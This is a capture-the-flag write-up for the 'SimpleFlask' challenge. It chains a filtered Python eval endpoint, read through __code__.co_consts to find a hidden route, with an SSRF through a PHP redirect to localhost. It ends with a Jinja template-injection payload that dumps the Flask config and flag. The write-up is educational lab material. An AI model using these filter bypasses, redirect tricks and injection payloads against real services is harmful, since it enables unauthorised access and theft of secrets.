# SimpleFlask

## Index page

```py
# -*- coding: utf-8 -*-
from flask import Flask, request
import requests
from waf import *
import time
app = Flask(__name__)

@app.route('/ctfhint')
def ctf():
    hint =xxxx # hints
    trick = xxxx # trick
    return trick

@app.route('/')
def index():
    # app.txt
@app.route('/eval', methods=["POST"])
def my_eval():
    # post eval
@app.route(xxxxxx, methods=["POST"]) # Secret
def admin():
    # admin requests
if __name__ == '__main__':
    app.run(host='0.0.0.0',port=8080)
```

## Solution

Here we can send values to the `/eval` endpoint and execute arbitrary python commands, but we also have a `waf` filter. 
In eval values we can not use symbols `(){}[]`, some words :`__class__` and etc.

So, to get some `tricks` and `hints` from the `ctf` function we can use function object's attributes like `.__code__.co_consts` and `.__code__.co_names`. Let’s look to the result:

**request:**
```
POST /eval HTTP/1.1
Host: 124.70.206.91:10000
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

eval=ctf.__code__.co_consts
```

**result:**
```
(None, 'the admin route :h4rdt0f1nd_9792uagcaca00qjaf<!-- port : 5000 -->', 'too young too simple')
```

And for the payload `admin.__code__.co_names`:
```
('request', 'form', 'waf_ip', 'waf_path', 'len', 'requests', 'get', 'format', 'text')
``` 

Now we know the admin route: `/h4rdt0f1nd_9792uagcaca00qjaf`. 

The answer from the server by this route;
```
post ip=x.x.x.x&port=xxxx&path=xxx => http://ip:port/path
```

But, when we made a request to the `127.0.0.1` and port `5000` we got the error message: `hacker?`.

So, we understand that we can’t make requests to localhost. But we saw that the admin handler uses the `requests` library. That means that we can use location redirect to redirect the request on localhost.

Let’s create the request to our server and redirect the request to `127.0.0.1:5000` and we got the answer:
```
import flask
from xxxx import flag
app = flask.Flask(__name__)
app.config['FLAG'] = flag
@app.route('/')
def index():
    return open('app.txt').read()
@app.route('/<path:hack>')
def hack(hack):
    return flask.render_template_string(hack)
if __name__ == '__main__':
    app.run(host='0.0.0.0',port=5000)
```

Now we only need to send payload with template injection attack and get the `flag` from flask config.

Redirect looks like:
```
<?php
header("Location: http://127.0.0.1:5000/{{config.items()}}");
?>
```

The answer is:
```

[("JSON_AS_ASCII", True), ("USE_X_SENDFILE", False), ("SESSION_COOKIE_SECURE", False), ("SESSION_COOKIE_PATH", None), ("SESSION_COOKIE_DOMAIN", None), ("SESSION_COOKIE_NAME", "session"), ("MAX_COOKIE_SIZE", 4093), ("SESSION_COOKIE_SAMESITE", None), ("PROPAGATE_EXCEPTIONS", None), ("ENV", "production"), ("DEBUG", False), ("SECRET_KEY", None), ("EXPLAIN_TEMPLATE_LOADING", False), ("MAX_CONTENT_LENGTH", None), ("APPLICATION_ROOT", "/"), ("SERVER_NAME", None), ("FLAG", "GACTF{wuhUwuHu_a1rpl4n3}"), ("PREFERRED_URL_SCHEME", "http"), ("JSONIFY_PRETTYPRINT_REGULAR", False), ("TESTING", False), ("PERMANENT_SESSION_LIFETIME", datetime.timedelta(31)), ("TEMPLATES_AUTO_RELOAD", None), ("TRAP_BAD_REQUEST_ERRORS", None), ("JSON_SORT_KEYS", True), ("JSONIFY_MIMETYPE", "application/json"), ("SESSION_COOKIE_HTTPONLY", True), ("SEND_FILE_MAX_AGE_DEFAULT", datetime.timedelta(0, 43200)), ("PRESERVE_CONTEXT_ON_EXCEPTION", None), ("SESSION_REFRESH_EACH_REQUEST", True), ("TRAP_HTTP_EXCEPTIONS", False)]
```

